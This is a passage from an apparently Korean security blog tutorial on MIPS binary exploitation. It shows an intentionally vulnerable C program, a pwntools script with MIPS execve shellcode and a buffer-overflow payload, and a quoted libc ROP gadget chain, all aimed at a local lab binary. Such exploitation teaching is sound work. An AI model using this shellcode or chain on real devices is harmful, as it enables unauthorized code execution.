<p>offset&#xC744; &#xB9DE;&#xCD94;&#xC5B4; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD574;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xC798; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h3 id="4-2-shellcode"><a href="#4-2-shellcode" class="headerlink" title="4-2: shellcode"></a>4-2: shellcode</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>{
        setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);
        sleep(<span class="hljs-number">1</span>);

        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;buf: %p\n&quot;</span>, buf);
        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre>
<p>&#xC55E;&#xC11C; &#xC124;&#xBA85;&#xD55C; MIPS&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Cache Incoherency&#xB97C; &#xACE0;&#xB824;&#xD558;&#xC5EC; shellcode&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC608;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xC5ED;&#xC2DC; bof&#xAC00; &#xBC1C;&#xC0DD;&#xB418;&#xB294; &#xCF54;&#xB4DC;&#xACE0;, NX&#xB97C; &#xD574;&#xC81C;&#xD558;&#xC5EC; &#xBE4C;&#xB4DC; &#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xB9AC;&#xD134; &#xC8FC;&#xC18C; offset&#xC740; &#xC774;&#xC804; &#xBB38;&#xC81C;&#xC640; &#xB3D9;&#xC77C;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p><img src="image7.png" srcset="/img/loading.gif" alt="image7.png"></p>
<p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC2A4;&#xD0DD; &#xC815;&#xB9AC; &#xAC00;&#xC82F;&#xC740; <code>__libc_csu_init</code>&#xB0B4; &#xC8FC;&#xC18C;&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time

p = remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">3312</span>)

sh = <span class="hljs-string">b&quot;\x69\x6e\x02\x3c\x2f\x62\x42\x24\xec\xff\xa2\xaf\x73\x68\x03\x3c\x2f\x2f\x63\x24\xf0\xff\xa3\xaf\xf4\xff\xa0\xaf\xfc\xff\xa0\xaf\xfc\xff\xa6\x27\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01\x01\x01&quot;</span>

sleep_addr = <span class="hljs-number">0x00400970</span>
gadget = <span class="hljs-number">0x00400824</span>

p.recvuntil(<span class="hljs-string">b&quot;buf: &quot;</span>)
addr = int(p.recv(<span class="hljs-number">10</span>), <span class="hljs-number">16</span>)

log.success(<span class="hljs-string">&quot;addr is {}&quot;</span>.format(hex(addr)))

pay = sh
pay += <span class="hljs-string">b&quot;A&quot;</span> * (<span class="hljs-number">108</span> - len(sh))
pay += p32(sleep_addr)
pay += p32(gadget)
pay += p32(addr)

time.sleep(<span class="hljs-number">1</span>)
p.sendline(pay)
p.interactive()</code></pre>
<p><img src="image8.png" srcset="/img/loading.gif" alt="image8.png"></p>
<p>&#xC704;&#xC640; &#xAC19;&#xC774; <code>sleep()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0;, &#xC2A4;&#xD0DD; &#xC815;&#xB9AC; &#xAC00;&#xC82F; &#xC774;&#xD6C4;&#xC5D0; shellcode &#xC8FC;&#xC18C;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC774; &#xAC00;&#xC7A5; &#xAE30;&#xBCF8;&#xC801;&#xC785;&#xB2C8;&#xB2E4;. Shellcode&#xB294; MIPS&#xC6A9;&#xC785;&#xB2C8;&#xB2E4;.</p>
<p>&#xC2E4;&#xC81C;&#xB85C; shellcode&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; libc base leak&#xACFC; <code>sleep()</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC5D0; &#xB530;&#xB978; &#xAC00;&#xC82F; &#xD638;&#xCD9C;&#xB3C4; &#xD544;&#xC694;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, ROP &#xACF5;&#xACA9;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; &#xB9C1;&#xD06C;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p>
<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.exploit-db.com/exploits/48994">https://www.exploit-db.com/exploits/48994</a></p>
<pre><code class="hljs python">First ROP (sleep_gadget): <span class="hljs-number">0x0004c974</span> + libc_base = <span class="hljs-number">0x2ab2e974</span>
<span class="hljs-number">0x0004c97c</span>      move    t9, s0
<span class="hljs-number">0x0004c980</span>      lw      ra, (var_1ch)
<span class="hljs-number">0x0004c984</span>      lw      s0, (var_18h)
<span class="hljs-number">0x0004c988</span>      addiu   a0, zero, <span class="hljs-number">2</span> ; arg1
<span class="hljs-number">0x0004c98c</span>      addiu   a1, zero, <span class="hljs-number">1</span> ; arg2
<span class="hljs-number">0x0004c990</span>      move    a2, zero
<span class="hljs-number">0x0004c994</span>      jr      t9

Second ROP (stack_gadget): <span class="hljs-number">0x00039fa8</span> + libc_base = <span class="hljs-number">0x2ab1bfa8</span>
<span class="hljs-number">0x00039fa8</span>      addiu   s0, sp, <span class="hljs-number">0x28</span>
<span class="hljs-number">0x00039fac</span>      move    a0, s3
<span class="hljs-number">0x00039fb0</span>      move    a1, s0
<span class="hljs-number">0x00039fb4</span>      move    t9, s1
<span class="hljs-number">0x00039fb8</span>      jalr    t9

Third ROP (call_gadget): <span class="hljs-number">0x000406d8</span> + libc_base = <span class="hljs-number">0x2ab226d8</span>
<span class="hljs-number">0x000406d8</span>      move    t9, s0
<span class="hljs-number">0x000406dc</span>      jalr    t9

payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">160</span> + sleep_addr + call_gadget +  sleep_gadget + junk + stack_gadget + shellcode
</code></pre>
<p>&#xD574;&#xB2F9; &#xB9C1;&#xD06C;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD55C; ROP &#xAC00;&#xC82F;&#xACFC; &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;.</p>
<p>&#xCCAB;&#xBC88;&#xC9F8; &#xAC00;&#xC82F;&#xC740; <code>sleep()</code> &#xC0AC;&#xC6A9;&#xC744; &#xC704;&#xD574; &#xD544;&#xC694;&#xD55C; &#xC778;&#xC790; &#xC138;&#xD305;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xAC00;&#xC82F;&#xC785;&#xB2C8;&#xB2E4;. &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;&#xC744; <code>0</code>&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xD560; &#xB54C;, <code>0</code>&#xC774; &#xC544;&#xB2CC; <code>zero</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83; &#xC5ED;&#xC2DC; MIPS&#xC758; &#xD2B9;&#xC9D5;&#xC774;&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<p>&#xB450;&#xBC88;&#xC9F8; &#xAC00;&#xC82F;&#xC740; &#xC2A4;&#xD0DD; &#xC815;&#xB9AC; &#xAC00;&#xC82F;&#xC73C;&#xB85C;, &#xC55E;&#xC120; &#xC2E4;&#xC2B5;&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD55C; <code>__libc_csu_init</code>&#xACFC; &#xAC19;&#xC740; &#xD568;&#xC218;&#xB4E4;&#xC5D0;&#xC11C; &#xC5B4;&#xB835;&#xC9C0; &#xC54A;&#xAC8C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xAC00;&#xC82F;&#xACFC; &#xB354;&#xBD88;&#xC5B4; ROP &#xCCB4;&#xC778;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xB05D;&#xC73C;&#xB85C; MIPS &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC2E4;&#xC2B5;&#xD558;&#xAE30;&#xAC00; &#xC870;&#xAE08; &#xC5B4;&#xB835;&#xACE0;, CTF &#xBB38;&#xC81C;&#xB85C; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xACE0; &#xC2F6;&#xC73C;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; &#xC544;&#xB798; &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xCC38;&#xACE0;&#xD558;&#xC2DC;&#xBA74; &#xB420; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<ul>
<li><strong>Hack.lu 2019 - no_risc_no_future</strong></li>
<li><strong>HackCTF - BabyMIPS</strong></li>
</ul>
<p>MIPS&#xC640; &#xAC19;&#xC740; RISC &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB294; &#xCC98;&#xC74C;&#xC5D0;&#xB294; &#xB0AF;&#xC124;&#xC9C0;&#xB9CC;, &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xD2B9;&#xC131;&#xC5D0; &#xB530;&#xB978; &#xC775;&#xC2A4; &#xAFC0;&#xD301;(?)&#xC5D0; &#xC775;&#xC219;&#xD574;&#xC9C0;&#xBA74; &#xADF8;&#xB798;&#xB3C4; &#xD560;&#xB9CC; &#xD55C; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;! &#xCC98;&#xC74C; MIPS&#xC5D0;&#xC11C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC5D0;&#xAC8C; &#xC870;&#xAE08;&#xC774;&#xB098;&#xB9C8; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<p>&#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xB2E4;&#xB978; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC8FC;&#xC81C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;! &#x1F44B;&#x1F3FB;</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                <div class="post-meta mr-3">
                  <i class="iconfont icon-category"></i>
                  
                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
                  
                </div>
                
                
                <div class="post-meta">
                  <i class="iconfont icon-tags"></i>
                  
                  <a class="hover-with-bg" href="/tags/newp1ayer48/">newp1ayer48</a>
                  
                  <a class="hover-with-bg" href="/tags/Embedded/">Embedded</a>
                  
                  <a class="hover-with-bg" href="/tags/MIPS/">MIPS</a>
                  
                </div>
                
              </div>

              <div class="post-metas mb-3">
                <a class="hover-with-bg" style="display: flex;" href="/author">
                  <div class="link-avatar-page">
                    <img src="/img/profile_newp1ayer48.jpg" srcset="/img/loading.gif" alt="newp1ayer48">
                  </div>

                  <div class="link-text">
                    <div class="link-title">newp1ayer48</div>
                  </div>
                </a>
                <div class="link-text">
                  <div class="link-more">
                    <a href="/tags/newp1ayer48">
                      Read more
                      <i class="iconfont icon-arrowdown"></i>
                    </a>
                  </div>
                </div>
              </div>

              <hr>
              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              
              <!--  -->
              <p class="note note-warning">  <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a>  .        .</p>
              
              
              
              <div class="post-prevnext row">
                <article class="post-prev col-6">
                  
                  
                  <a href="/2025/08/23/poosic/cve-2025-2028_1cve-2025-20337/">
                    <i class="iconfont icon-arrowleft"></i>
                    <span class="hidden-mobile">[] CVE-2025-20281/CVE-2025-20337 : Cisco Identity Services Engine    </span>
                    <span class="visible-mobile">Previous</span>
                  </a>
                  
                </article>
                <article class="post-next col-6">
                  
                  
                  <a href="/2025/08/21/newp1ayer48/mips/en/">
                    <span class="hidden-mobile">[Research] Exploitation basic in MIPS (EN)</span>
                    <span class="visible-mobile">Next</span>
                    <i class="iconfont icon-arrowright"></i>
                  </a>
                  
                </article>
              </div>
              
            </div>
            
            <!-- Embed Section -->
            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
            </div>            

            
            <!-- Comments -->
            <article class="comments" id="comments">
              
              
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'https://hackyboiz.github.io/2025/08/21/newp1ayer48/mips/ko/';
        this.page.identifier = '/2025/08/21/newp1ayer48/mips/ko/';
      };
      function loadDisqus() {
        (function () {
          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      waitElementVisible('disqus_thread', loadDisqus);
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
    </noscript>
  </div>


            </article>
            
          </article>
        </div>
      </div>
    </div>
    
    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
      <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

    </div>
    
  </div>
</div>

<!-- Custom -->

    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="/js/debouncer.js"></script>
<script src="/js/main.js"></script>

<!-- Plugins -->


  
    <script src="/js/lazyload.js"></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
  <script src="/js/clipboard-use.js"></script>







  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "[Research] Exploitation basic in MIPS (KO)&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>





  

  
    <!-- MathJax -->
    <script>
      MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
        },
        options: {
          renderActions: {
            findScript: [10, doc => {
              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
                const display = !!node.type.match(/; *mode=display/);
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
                const text = document.createTextNode('');
                node.parentNode.replaceChild(text, node);
                math.start = { node: text, delim: '', n: 0 };
                math.end = { node: text, delim: '', n: 0 };
                doc.math.push(math);
              });
            }, '', false],
            insertedScript: [200, () => {
              document.querySelectorAll('mjx-container').forEach(node => {
                let target = node.parentNode;
                if (target.nodeName.toLowerCase() === 'li') {
                  target.parentNode.classList.add('has-jax');
                }
              });
            }, '', false]
          }
        }
      };
    </script>

    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>

  













  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'UA-177243668-2', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-177243668-2');
    </script>
  

  

  

  





</body>
</html>
